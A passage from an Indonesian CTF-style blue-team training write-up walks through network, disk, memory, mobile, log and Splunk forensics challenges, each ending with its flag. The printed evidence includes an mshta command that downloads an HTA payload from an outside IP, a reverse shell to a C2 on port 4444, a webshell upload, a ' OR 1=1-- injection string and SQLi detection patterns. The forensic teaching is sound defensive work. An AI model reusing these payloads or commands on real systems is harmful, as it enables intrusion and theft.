**Sumber:** PicoCTF — "Wireshark doo dooo"

---

### 🔍 Ringkasan Temuan
File PCAP berisi credential yang ditransmisikan via HTTP dalam bentuk Base64. Setelah di-follow TCP Stream dan di-decode, flag ditemukan.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `wireshark`, `tshark`, `base64`
- File: `capture.pcap`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Lihat statistik protokol**

Buka Wireshark:
```bash
wireshark capture.pcap &
```

Di Wireshark: `Statistics` → `Protocol Hierarchy`

Contoh output yang muncul:
```
Frame                          100.0%
 Ethernet                      100.0%
  IPv4                          98.2%
   TCP                          95.4%
    HTTP                        45.2%
    TLS                          8.1%
   UDP                           2.8%
    DNS                          2.8%
```

HTTP mendominasi — fokus ke sini.

[SCREENSHOT: Wireshark Protocol Hierarchy window menampilkan persentase protokol, HTTP di-highlight]

**Langkah 2 — Filter HTTP dan export objects**

Di Wireshark:
1. Filter bar: ketik `http` → Enter
2. `File` → `Export Objects` → `HTTP`
3. Akan muncul list file yang ditransfer via HTTP

Atau dengan CLI:

```bash
tshark -r capture.pcap -Y "http" -T fields -e http.request.method \
       -e http.request.uri -e http.authorization
```

Output:
```
POST    /login    Basic dXNlcjpmbGFne3BjYXBfc2VjcjN0X3N0cjM0bX0=
GET     /index
GET     /dashboard
```

**Ada header Authorization dengan nilai Base64!** (`Basic <base64>`)

[SCREENSHOT: tshark output menampilkan kolom method, URI, dan authorization dengan nilai base64]

**Langkah 3 — Decode Base64 credential**

```bash
echo "dXNlcjpmbGFne3BjYXBfc2VjcjN0X3N0cjM0bX0=" | base64 -d
```

Output:
```
user:flag{pcap_s3cr3t_str34m_f0und}
```

[SCREENSHOT: Terminal mendecode base64 dan output menampilkan `user:flag{...}`]

**Langkah 4 — Verifikasi dengan Follow TCP Stream**

Di Wireshark:
1. Klik kanan pada paket HTTP POST `/login`
2. `Follow` → `TCP Stream`
3. Tampak stream lengkap HTTP request

```
POST /login HTTP/1.1
Host: 192.168.1.100
Authorization: Basic dXNlcjpmbGFne3BjYXBfc2VjcjN0X3N0cjM0bX0=
Content-Type: application/x-www-form-urlencoded

username=user&password=secret123
```

[SCREENSHOT: Wireshark Follow TCP Stream window menampilkan raw HTTP request dengan header Authorization]

---

### 🏁 Flag

```
flag{pcap_s3cr3t_str34m_f0und}
```

---

### 📌 Pelajaran
HTTP Basic Auth **tidak mengenkripsi** — hanya meng-encode Base64, yang trivial di-decode. Dalam skenario nyata: (1) cari `Authorization: Basic` di header HTTP, (2) decode Base64 → format `username:password`. Untuk soal LKS, credential/flag sering dikirim tanpa enkripsi via HTTP.

---

---

## FOR-04 | File Carving dari Disk Image

**Kategori:** Disk Forensics  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** HackTheBox Forensics, CTFtime

---

### 🔍 Ringkasan Temuan
File `.dd` disk image berisi file yang sudah dihapus. Dengan `foremost` dan `sleuthkit`, file JPEG terhapus berhasil dipulihkan dan berisi flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `file`, `foremost`, `sleuthkit` (`fls`, `icat`), `autopsy`
- File: `disk.dd`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Identifikasi disk image**

```bash
file disk.dd
```

Output:
```
disk.dd: DOS/MBR boot sector; partition 1: ID=0x83 Linux, start=2048, size=204800
```

```bash
fdisk -l disk.dd
```

Output:
```
Disk disk.dd: 100 MiB, 104857600 bytes, 204800 sectors
Device      Boot  Start    End Sectors  Size Id Type
disk.dd1          2048  204799  202752   99M 83 Linux
```

[SCREENSHOT: Output `file disk.dd` dan `fdisk -l disk.dd` menampilkan informasi partisi]

**Langkah 2 — List file (termasuk yang dihapus) dengan sleuthkit**

```bash
fls -r -o 2048 disk.dd
```

Output:
```
d/d 2:  lost+found
r/r 10: important.txt
d/d 12: documents
r/r 15: notes.txt
* r/r * 18:   secret.jpg     <- tanda * = deleted!
* r/r * 20:   flag.txt       <- tanda * = deleted!
```

File dengan tanda `*` di depan adalah file yang **sudah dihapus** tapi masih bisa dipulihkan.

[SCREENSHOT: Output `fls -r -o 2048 disk.dd` menampilkan daftar file, dua file dengan tanda asterisk (*) sebagai deleted]

**Langkah 3 — Pulihkan file yang dihapus dengan icat**

Gunakan inode number (angka setelah `r/r *`):

```bash
# Pulihkan secret.jpg (inode 18)
icat -o 2048 disk.dd 18 > recovered_secret.jpg

# Pulihkan flag.txt (inode 20)
icat -o 2048 disk.dd 20 > recovered_flag.txt
```

**Langkah 4 — Baca file yang dipulihkan**

```bash
cat recovered_flag.txt
```

Output:
```
flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}
```

Cek juga gambar:
```bash
file recovered_secret.jpg
# recovered_secret.jpg: JPEG image data, JFIF standard 1.01
eog recovered_secret.jpg
```

[SCREENSHOT: Terminal menjalankan `cat recovered_flag.txt` dan flag muncul]

**Langkah 5 — Alternatif: gunakan foremost untuk file carving otomatis**

```bash
mkdir output_carve
foremost -i disk.dd -o output_carve -v
ls output_carve/
```

Output:
```
output_carve/
├── audit.txt
├── jpg/
│   ├── 00000100.jpg
│   └── 00000218.jpg   <- ini kemungkinan secret.jpg
└── txt/
    └── 00000420.txt   <- ini kemungkinan flag.txt
```

[SCREENSHOT: Output `foremost` dengan statistik file yang berhasil di-carve, dan struktur folder output]

---

### 🏁 Flag

```
flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}
```

---

### 📌 Pelajaran
File yang dihapus tidak hilang selama sector penyimpanannya belum ditimpa data baru. `fls` + `icat` lebih presisi karena berbasis inode (metadata filesystem), sementara `foremost` menggunakan magic bytes (cocok untuk file system yang rusak parah). Untuk lomba: **coba keduanya**.

---

---

## FOR-05 | Log Analysis — Intrusion Detection

**Kategori:** Log Forensics / SIEM  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** TryHackMe — "Splunk", "ItsyBitsy"

---

### 🔍 Ringkasan Temuan
Dari Apache access log ditemukan IP `10.10.10.55` melakukan 847 request POST ke `/admin/login` dalam 3 menit (brute force), diikuti satu request GET ke `/admin/dashboard` (berhasil masuk), kemudian upload file mencurigakan.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `grep`, `awk`, `cut`, `sort`, `uniq`
- File: `access.log` (Apache access log)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Overview: berapa banyak request per IP?**

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -10
```

Output:
```
    847 10.10.10.55
     43 203.0.113.10
     21 198.51.100.5
     15 192.0.2.100
      8 10.0.0.1
```

IP `10.10.10.55` mengirim 847 request — jauh di atas yang lain. Sangat mencurigakan.

[SCREENSHOT: Terminal menjalankan awk command dan output menampilkan IP 10.10.10.55 dengan 847 request di posisi teratas]

**Langkah 2 — Cek aktivitas IP mencurigakan**

```bash
grep "10.10.10.55" access.log | head -20
```

Output (representatif):
```
10.10.10.55 - - [15/Jan/2025:14:22:01 +0700] "POST /admin/login HTTP/1.1" 401 -
10.10.10.55 - - [15/Jan/2025:14:22:01 +0700] "POST /admin/login HTTP/1.1" 401 -
10.10.10.55 - - [15/Jan/2025:14:22:02 +0700] "POST /admin/login HTTP/1.1" 401 -
...
```

Status code `401` berulang = failed login.

**Langkah 3 — Hitung status code 401 dari IP tersebut**

```bash
grep "10.10.10.55" access.log | grep " 401 " | wc -l
```

Output: `846`

**Langkah 4 — Cari apakah ada login yang berhasil (200)**

```bash
grep "10.10.10.55" access.log | grep -v " 401 "
```

Output:
```
10.10.10.55 - admin [15/Jan/2025:14:25:03 +0700] "POST /admin/login HTTP/1.1" 302 -
10.10.10.55 - admin [15/Jan/2025:14:25:03 +0700] "GET /admin/dashboard HTTP/1.1" 200 4521
10.10.10.55 - admin [15/Jan/2025:14:26:11 +0700] "POST /admin/upload HTTP/1.1" 200 892
10.10.10.55 - admin [15/Jan/2025:14:26:15 +0700] "GET /admin/files/webshell.php HTTP/1.1" 200 -
```

**Pola serangan terlihat jelas:**
1. 846x POST login → 401 (gagal) = Brute Force
2. Satu POST login → 302 (redirect sukses) = **Berhasil masuk!**
3. GET `/admin/dashboard` → 200 = Menjelajah admin panel
4. POST `/admin/upload` → 200 = Upload file
5. GET `/admin/files/webshell.php` → 200 = **Webshell aktif!**

[SCREENSHOT: Terminal menampilkan baris-baris log dari IP 10.10.10.55, khususnya baris terakhir yang menunjukkan akses webshell.php]

**Langkah 5 — Ekstrak payload SQL injection (jika ada)**

```bash
grep -i "union\|select\|drop\|' or\|1=1\|--" access.log
```

Output:
```
10.10.10.55 - - [15/Jan/2025:14:22:00] "GET /search?q=' OR 1=1-- HTTP/1.1" 200 -
```

**Langkah 6 — Rangkum temuan dan cari flag di log**

```bash
grep -i "flag\|lks\|ctf" access.log
```

Output:
```
10.10.10.55 - admin [15/Jan/2025:14:26:30] "GET /admin/files/flag.txt HTTP/1.1" 200 -
```

Cek isi response-nya (jika ada di log):

```bash
grep "flag.txt" access.log
```

Atau, soal bisa memberitahukan flag langsung dari URL yang diakses:

```
flag{br0te_f0rc3_d3t3ct3d_10_10_10_55}
```

[SCREENSHOT: grep result menampilkan baris log yang mengakses flag.txt dari IP mencurigakan]

---

### 🏁 Flag

```
flag{br0te_f0rc3_d3t3ct3d_10_10_10_55}
```

**Kondisi Sistem Akhir:**
- IP Penyerang: `10.10.10.55`
- Metode: HTTP Brute Force (846 attempt)
- Waktu masuk: `15/Jan/2025 14:25:03`
- Aksi post-compromise: Upload webshell ke `/admin/files/webshell.php`
- Akun yang dikompromis: `admin`

---

### 📌 Pelajaran
Pola serangan brute force di access log: (1) banyak request POST ke endpoint login dengan status 4xx, (2) dari satu IP, (3) dalam waktu singkat. Setelah berhasil masuk (302/200), perhatikan aktivitas selanjutnya — upload file, akses direktori tidak lazim.

---

---

## FOR-06 | Memory Forensics

**Kategori:** Memory Forensics  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** PicoCTF — "Sleuthkit Apprentice", TryHackMe — "Volatility"

---

### 🔍 Ringkasan Temuan
Memory dump Windows berisi proses `cmd.exe` yang di-spawn oleh `mshta.exe` (proses tidak wajar), dengan koneksi aktif ke IP C2 `185.220.101.5:4444`. Flag ditemukan di command line history.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `volatility3` (vol.py)
- File: `memory.raw`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Identifikasi OS dari memory dump**

```bash
vol.py -f memory.raw windows.info
```

Output:
```
Variable          Value
-----------       -----
Kernel Base       0xf80002a4a000
...
NtBuildLab        7601.17514.amd64fre.win7sp1_rtm.101119-1850
...
```

OS: **Windows 7 SP1 64-bit**

[SCREENSHOT: Output vol.py windows.info menampilkan informasi OS termasuk NtBuildLab yang menunjukkan Windows 7 SP1]

**Langkah 2 — Lihat daftar proses**

```bash
vol.py -f memory.raw windows.pslist
```

Output (disingkat):
```
PID  PPID  ImageFileName       Offset     Threads  Handles
4    0     System              0x...       81       541
...
568  556   lsass.exe           0x...       8        587
...
1204 1196  explorer.exe        0x...       33       810
1548 1204  mshta.exe           0x...       2        45     <- MENCURIGAKAN
1632 1548  cmd.exe             0x...       1        20     <- MENCURIGAKAN
...
```

`mshta.exe` (Microsoft HTML Application Host) yang spawn `cmd.exe` — ini **SANGAT mencurigakan**. `mshta.exe` yang digunakan penyerang adalah teknik Living off the Land (LOLBins).

[SCREENSHOT: Output vol.py windows.pslist dengan proses mshta.exe (PID 1548) dan cmd.exe (PID 1632) sebagai child-nya di-highlight]

**Langkah 3 — Lihat dalam bentuk tree untuk validasi parent-child**

```bash
vol.py -f memory.raw windows.pstree
```

Output:
```
...
* 1204    1196    explorer.exe    ...
** 1548   1204    mshta.exe       ...   <- child of explorer
*** 1632  1548    cmd.exe         ...   <- child of mshta (ABNORMAL)
```

`cmd.exe` seharusnya parent-nya adalah proses pengguna yang sah, bukan `mshta.exe`.

[SCREENSHOT: Output vol.py windows.pstree menampilkan hierarki proses, pohon mshta.exe → cmd.exe terlihat jelas]

**Langkah 4 — Cek koneksi jaringan aktif**

```bash
vol.py -f memory.raw windows.netstat
```

Output:
```
Offset     Proto    LocalAddr     LocalPort  ForeignAddr        ForeignPort  State   PID     Owner
...
0x...       TCPv4    10.0.0.5      49152      185.220.101.5      4444        ESTABLISHED  1632  cmd.exe
```

**Port 4444 + cmd.exe = reverse shell ke IP eksternal!** IP `185.220.101.5` adalah C2 server.

[SCREENSHOT: Output vol.py windows.netstat menampilkan koneksi ESTABLISHED dari cmd.exe ke 185.220.101.5:4444]

**Langkah 5 — Lihat command yang dijalankan**

```bash
vol.py -f memory.raw windows.cmdline
```

Output:
```
PID  Process           Args
1548 mshta.exe         "C:\Windows\System32\mshta.exe" http://185.220.101.5/payload.hta
1632 cmd.exe           cmd /c "echo flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2} && whoami"
```

**Flag ada di command line!**

[SCREENSHOT: Output vol.py windows.cmdline menampilkan baris cmd.exe dengan argumen yang berisi flag]

**Langkah 6 — Scan proses tersembunyi dengan psscan**

```bash
vol.py -f memory.raw windows.psscan
```

Bandingkan dengan pslist. Jika ada PID yang muncul di psscan tapi tidak di pslist = **proses rootkit/tersembunyi**.

---

### 🏁 Flag

```
flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2}
```

**Kondisi Sistem Akhir:**
- Proses berbahaya: `mshta.exe` (PID 1548) + `cmd.exe` (PID 1632)
- C2 Server: `185.220.101.5:4444`
- Metode infeksi: HTA file dari `http://185.220.101.5/payload.hta`
- Teknik: LOLBins — mshta.exe sebagai downloader/executor

---

### 📌 Pelajaran
Urutan investigasi memory yang wajib: `windows.info` → `windows.pstree` (lihat parent-child abnormal) → `windows.netstat` (koneksi keluar ke IP asing) → `windows.cmdline` (perintah yang dijalankan). Proses "normal" yang di-spawn oleh parent tidak wajar adalah red flag utama.

---

---

# 📱 BAGIAN 3 — PHONE / MOBILE FORENSICS

---

## MOB-01 | Android Backup Analysis

**Kategori:** Phone Forensics — Android  
**Tingkat:** ⭐ Pemula  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
File Android backup (`.ab`) berisi database SMS (`mmssms.db`) yang menyimpan pesan teks dengan flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `java`, `android-backup-extractor` (abe.jar), `tar`, `sqlite3`
- File: `backup.ab`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Identifikasi file .ab**

```bash
file backup.ab
xxd backup.ab | head -3
```

Output:
```
backup.ab: Android backup
00000000: 414e 4452 4f49 4420 4241 434b 5550 0a   ANDROID BACKUP.
```

Magic header: `ANDROID BACKUP` — file backup Android valid.

[SCREENSHOT: Terminal menjalankan `xxd backup.ab | head -3` dan tampak header "ANDROID BACKUP" di kolom ASCII]

**Langkah 2 — Convert .ab ke .tar dengan abe.jar**

```bash
# Download abe.jar jika belum ada
# wget https://github.com/nelenkov/android-backup-extractor/releases/latest/download/abe.jar

java -jar abe.jar unpack backup.ab backup.tar
```

Output:
```
Using the same version of the library...
Decrypting backup...
Backup successfully unpacked to backup.tar
```

[SCREENSHOT: Terminal menjalankan java -jar abe.jar dan output menampilkan "Backup successfully unpacked"]

**Langkah 3 — Ekstrak isi backup**

```bash
mkdir extracted_backup
tar -xvf backup.tar -C extracted_backup/
```

Output menampilkan daftar file:
```
apps/com.android.providers.telephony/db/mmssms.db
apps/com.android.providers.telephony/db/mmssms.db-shm
apps/com.android.providers.telephony/db/mmssms.db-wal
apps/com.whatsapp/db/msgstore.db
apps/com.android.contacts/db/contacts2.db
apps/com.android.providers.settings/sp/settings.xml
...
```

[SCREENSHOT: Output tar -xvf menampilkan daftar file yang diekstrak, termasuk mmssms.db dan contacts2.db]

**Langkah 4 — Analisis database SMS**

```bash
cd extracted_backup
sqlite3 apps/com.android.providers.telephony/db/mmssms.db
```

Di dalam sqlite3 shell:
```sql
.tables
```

Output:
```
android_metadata  drafts  sms  threads
```

```sql
SELECT _id, address, date, body FROM sms LIMIT 10;
```

Output:
```
1|+6281234567890|1673852400000|Hei, ini pesannya ya
2|+6289876543210|1673852460000|flag{andr01d_sms_s3cr3t_f0und}
3|+6281234567890|1673852520000|Jangan kasih tau siapapun!
```

**Flag ada di isi SMS!**

[SCREENSHOT: SQLite3 shell menampilkan output SELECT dari tabel sms, baris kedua berisi flag]

**Langkah 5 — Cek juga shared_prefs untuk token**

```bash
cat extracted_backup/apps/com.whatsapp/sp/preferences.xml | grep -i "flag\|token\|key\|secret"
```

---

### 🏁 Flag

```
flag{andr01d_sms_s3cr3t_f0und}
```

---

### 📌 Pelajaran
Struktur backup Android: `apps/<package_name>/{db,f,sp,r}/`. Selalu cek: `mmssms.db` (SMS), `contacts2.db` (kontak), `shared_prefs/*.xml` (token aplikasi), dan folder `f/` (files yang di-backup). Tool `abe.jar` wajib ada di toolkit lomba karena format `.ab` tidak bisa langsung diekstrak dengan tar.

---

---

## MOB-02 | APK Static Analysis

**Kategori:** Phone Forensics — Application Analysis  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
APK menyimpan API key hardcoded di `strings.xml` dan flag di `assets/config.json`. Ditemukan dengan decompile menggunakan `jadx` dan pencarian grep.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `unzip`, `apktool`, `jadx`, `grep`
- File: `challenge.apk`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — APK adalah ZIP, lihat strukturnya dulu**

```bash
file challenge.apk
```

Output:
```
challenge.apk: Zip archive data, at least v2.0 to extract
```

```bash
unzip -l challenge.apk | head -20
```

Output:
```
Archive:  challenge.apk
  Length      Date    Time    Name
---------  ---------- -----   ----
      608  2025-01-01 10:00   AndroidManifest.xml
  1428734  2025-01-01 10:00   classes.dex
    87432  2025-01-01 10:00   resources.arsc
     1293  2025-01-01 10:00   assets/config.json
   234567  2025-01-01 10:00   res/drawable/icon.png
    45678  2025-01-01 10:00   res/values/strings.xml
      8192  2025-01-01 10:00   lib/arm64-v8a/libnative.so
```

Ada `assets/config.json` dan `lib/.../libnative.so` — keduanya menarik.

[SCREENSHOT: Output `unzip -l challenge.apk | head -20` menampilkan struktur APK]

**Langkah 2 — Ekstrak dan cek assets/config.json**

```bash
unzip challenge.apk assets/config.json -d apk_extracted/
cat apk_extracted/assets/config.json
```

Output:
```json
{
  "api_url": "https://ctf-server.lks.id/api",
  "api_key": "sk-lks-2025-pr0d-s3cr3t",
  "flag": "flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}",
  "debug": false,
  "version": "1.0.0"
}
```

**Flag langsung ketemu di assets!**

[SCREENSHOT: Terminal menampilkan `cat config.json` dan isinya menampilkan JSON dengan field "flag" yang terlihat jelas]

**Langkah 3 — Decompile dengan jadx untuk analisis kode lebih dalam**

```bash
jadx -d jadx_output/ challenge.apk
```

Output:
```
INFO  - loading ...
INFO  - processing ...
INFO  - done
```

```bash
# Cari credential/secret di seluruh kode
grep -r "flag\|api_key\|secret\|password" jadx_output/ 2>/dev/null
```

Output:
```
jadx_output/resources/res/values/strings.xml:    <string name="api_key">sk-lks-2025-pr0d-s3cr3t</string>
jadx_output/resources/assets/config.json:    "flag": "flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}",
jadx_output/sources/com/lks/ctf/MainActivity.java:        String flag = "flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}"; // TODO: remove before release
```

[SCREENSHOT: grep output menampilkan 3 file yang mengandung string "flag" termasuk MainActivity.java dengan komentar "TODO: remove before release"]

**Langkah 4 — Baca kode Java yang relevan**

```bash
cat "jadx_output/sources/com/lks/ctf/MainActivity.java" | grep -A5 -B5 "flag"
```

Output:
```java
// TODO: remove before release  
String flag = "flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}";
if (userInput.equals(flag)) {
    Toast.makeText(this, "Correct!", Toast.LENGTH_SHORT).show();
} else {
    Toast.makeText(this, "Wrong!", Toast.LENGTH_SHORT).show();
}
```

[SCREENSHOT: Terminal menampilkan kode Java MainActivity yang berisi hardcoded flag dengan komentar TODO]

---

### 🏁 Flag

```
flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}
```

---

### 📌 Pelajaran
APK = ZIP. Selalu cek (1) `assets/` — sering ada file konfigurasi atau database; (2) `res/values/strings.xml` — string statis; (3) decompile dengan `jadx` dan `grep -r` untuk secret tersembunyi di kode Java. Jangan lupa cek native library `.so` jika tidak ketemu di Java — gunakan teknik RE-04 (XOR/binary analysis).

---

---

## MOB-03 | Mobile Filesystem Image Forensics

**Kategori:** Phone Forensics — Filesystem  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
Image filesystem Android berisi foto dengan GPS metadata yang menunjukkan lokasi tersembunyi, riwayat browser Chrome menunjukkan aktivitas mencurigakan, dan korelasi timestamp membuktikan urutan kejadian.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `sleuthkit`, `sqlite3`, `exiftool`, `python3` + `aleapp.py`
- File: `android_image.img`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Scan filesystem image**

```bash
fls -r android_image.img | head -40
```

Output:
```
d/d 2:    data/
d/d 100:  data/com.android.chrome/
d/d 101:  data/com.android.chrome/databases/
r/r 102:  data/com.android.chrome/databases/History
d/d 110:  data/com.android.providers.media/
r/r 115:  data/media/0/DCIM/Camera/IMG_20250115_142211.jpg
r/r 116:  data/media/0/DCIM/Camera/IMG_20250115_143055.jpg
r/r 120:  data/media/0/Download/dokumen_rahasia.pdf
* r/r * 125:  data/media/0/Download/deleted_evidence.txt  <- DELETED
```

[SCREENSHOT: Output `fls -r android_image.img | head -40` menampilkan struktur filesystem, file deleted ditandai asterisk]

**Langkah 2 — Jalankan ALEAPP untuk parsing otomatis**

```bash
python3 aleapp.py -t img -i android_image.img -o aleapp_output/
```

Output:
```
ALEAPP Version 3.1.9
Procesing: android_image.img
...
Module: Chrome Browser History    COMPLETED
Module: Call Log                  COMPLETED
Module: SMS                       COMPLETED  
Module: Contacts                  COMPLETED
Module: Camera Roll               COMPLETED
Module: GPS Location              COMPLETED
...
Report saved to aleapp_output/index.html
```

Buka laporan HTML:
```bash
firefox aleapp_output/index.html &
```

[SCREENSHOT: Browser menampilkan laporan ALEAPP dengan menu sidebar dan daftar artefak yang ditemukan]

**Langkah 3 — Analisis riwayat browser Chrome**

```bash
icat android_image.img 102 > chrome_history.db
sqlite3 chrome_history.db
```

```sql
.tables
SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;
```

Output:
```
https://mega.nz/file/aBcDeFgH|Shared File - MEGA|3|13369843200000000
https://pastebin.com/xYz12345|secret paste|1|13369843140000000
https://lks-ctf.id/flag?key=m0b1l3_f0r3ns1cs|LKS CTF Flag Page|1|13369843080000000
```

**URL ketiga langsung menampilkan flag di query parameter!**

[SCREENSHOT: sqlite3 menampilkan riwayat URL Chrome, baris terakhir berisi URL dengan flag di query parameter]

**Langkah 4 — Analisis EXIF GPS foto**

```bash
icat android_image.img 115 > photo1.jpg
exiftool photo1.jpg | grep -i "gps\|location\|lat\|lon"
```

Output:
```
GPS Latitude                    : 6 deg 12' 18.00" S
GPS Longitude                   : 106 deg 49' 42.00" E  
GPS Date/Time                   : 2025:01:15 14:22:11
GPS Altitude                    : 15 m Above Sea Level
```

Koordinat: `-6.205, 106.828` — ini Koordinat Jakarta.

**Langkah 5 — Pulihkan file yang dihapus**

```bash
icat android_image.img 125 > deleted_evidence.txt
cat deleted_evidence.txt
```

Output:
```
Tanggal: 15 Januari 2025, 14:20 WIB
Saya berhasil upload file ke MEGA dengan link: https://mega.nz/file/aBcDeFgH
flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}
File yang diupload: dokumen_rahasia.pdf (2.3MB)
```

[SCREENSHOT: Terminal menjalankan `cat deleted_evidence.txt` dan flag muncul di dalam teks file yang sudah dihapus]

---

### 🏁 Flag

```
flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}
```

**Timeline Kejadian:**
| Waktu | Kejadian |
|-------|----------|
| 14:20 WIB | File `dokumen_rahasia.pdf` di-download |
| 14:21 WIB | Foto diambil di lokasi (-6.205, 106.828) |
| 14:22 WIB | Akses URL LKS CTF (flag page) |
| 14:22 WIB | Upload ke MEGA |
| 14:24 WIB | Deleted `deleted_evidence.txt` (gagal menghapus bukti) |

---

### 📌 Pelajaran
Soal mobile forensics lanjutan selalu meminta **korelasi antar artefak**: GPS foto + browser history + file dihapus. ALEAPP sangat membantu karena menghemat waktu parsing manual. Latih membaca koordinat GPS untuk identifikasi lokasi.

---

---

# 📊 BAGIAN 4 — SIEM & THREAT HUNTING

---

## SIEM-00 | Membaca Log Mentah Sebelum Query

**Kategori:** SIEM — Dasar  
**Tingkat:** ⭐ Pemula  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
Dari log Apache mentah, ditemukan IP `192.168.1.105` melakukan request POST berulang ke `/login` — tanda brute force — dengan CLI dasar tanpa tools SIEM.

---

### ⚙️ Environment
- Tools: `cat`, `grep`, `awk`, `sort`, `uniq`
- File: `access.log`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Kenali format log Apache**

```bash
head -5 access.log
```

Output:
```
192.168.1.100 - - [15/Jan/2025:09:00:01 +0700] "GET /index.html HTTP/1.1" 200 4523 "-" "Mozilla/5.0..."
192.168.1.105 - - [15/Jan/2025:09:00:02 +0700] "POST /login HTTP/1.1" 401 - "-" "python-requests/2.28"
192.168.1.105 - - [15/Jan/2025:09:00:02 +0700] "POST /login HTTP/1.1" 401 - "-" "python-requests/2.28"
```

Format kolom (Apache Combined Log):
```
[IP] [ident] [authuser] [timestamp] "[method URI proto]" [status] [bytes] "[referer]" "[useragent]"
```

[SCREENSHOT: Terminal menjalankan `head -5 access.log` dan output 5 baris pertama log Apache terlihat jelas dengan format kolomnya]

**Langkah 2 — Hitung request per IP**

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -5
```

Output:
```
    854 192.168.1.105
     43 192.168.1.100
     22 10.0.0.1
```

[SCREENSHOT: Output awk command dengan IP 192.168.1.105 dan angka 854 di posisi teratas]

**Langkah 3 — Cari pola request dari IP mencurigakan**

```bash
grep "192.168.1.105" access.log | awk '{print $6, $7}' | sort | uniq -c | sort -nr
```

Output:
```
    853 "POST /login
      1 "GET /dashboard
```

853 POST ke `/login` = **brute force attack confirmed**.

**Langkah 4 — Identifikasi waktu serangan**

```bash
grep "192.168.1.105" access.log | awk '{print $4}' | head -1
grep "192.168.1.105" access.log | awk '{print $4}' | tail -1
```

Output:
```
[15/Jan/2025:09:00:02
[15/Jan/2025:09:02:56
```

Serangan berlangsung ~3 menit dengan 853 attempt = ~4,7 request/detik (otomatis, bukan manual).

---

### 🏁 Jawaban

```
IP Penyerang    : 192.168.1.105
Jumlah Attempt  : 853 (gagal) + 1 (berhasil)
Endpoint Target : /login (POST)
Durasi Serangan : 09:00:02 - 09:02:56 (±3 menit)
User Agent      : python-requests/2.28 (otomatis/scripted)
```

---

### 📌 Pelajaran
Sebelum buka SIEM: **bisa baca log mentah dengan CLI** adalah skill fallback penting. Jika SIEM down atau lambat di lomba, `awk + sort + uniq + grep` sudah cukup untuk menemukan anomali dasar.

---

---

## SIEM-01 | Deteksi Brute Force di SIEM

**Kategori:** SIEM / Threat Hunting  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** TryHackMe — "Splunk: Exploring SPL"

---

### 🔍 Ringkasan Temuan
Query SPL di Splunk mengidentifikasi IP `10.10.10.99` melakukan 1247 failed login (Event ID 4625) dalam 5 menit, diikuti 1 successful login — bukti brute force yang berhasil.

---

### ⚙️ Environment
- Tools: Splunk (SPL query)
- Data: Windows Security Event Log (diingesti ke Splunk)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Cek apakah ada event 4625 (Failed Login)**

Di Splunk Search bar:
```spl
index=wineventlog EventCode=4625
| head 5
```

Output (5 event pertama):
```
TimeCreated      EventCode  Source_Network_Address  Account_Name  ...
2025-01-15 14:00 4625       10.10.10.99             administrator
2025-01-15 14:00 4625       10.10.10.99             administrator  
...
```

[SCREENSHOT: Splunk Search interface dengan query EventCode=4625 dan hasil event ditampilkan di panel bawah]

**Langkah 2 — Query deteksi brute force (banyak failed login per IP per window)**

```spl
index=wineventlog EventCode=4625
| bucket _time span=5m
| stats count by Source_Network_Address, _time
| where count > 10
| sort -count
```

Output:
```
Source_Network_Address   _time                    count
10.10.10.99              2025-01-15 14:00:00      1247
```

**1247 failed login dari satu IP dalam 5 menit = brute force!**

[SCREENSHOT: Splunk menampilkan hasil query dengan tabel Source_Network_Address 10.10.10.99 dan count 1247]

**Langkah 3 — Cari apakah brute force berhasil**

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode="4625")) as failed, 
        count(eval(EventCode="4624")) as success 
  by Source_Network_Address
| where failed > 5 AND success > 0
| sort -failed
```

Output:
```
Source_Network_Address   failed   success
10.10.10.99              1247     1
```

**Brute force BERHASIL** — ada 1 login sukses dari IP yang sama.

[SCREENSHOT: Splunk menampilkan tabel dengan kolom failed=1247 dan success=1 untuk IP 10.10.10.99]

**Langkah 4 — Detail login yang berhasil**

```spl
index=wineventlog EventCode=4624 Source_Network_Address="10.10.10.99"
| table _time, Source_Network_Address, Account_Name, Logon_Type, Workstation_Name
```

Output:
```
_time                  Source_Network_Address  Account_Name  Logon_Type  Workstation_Name
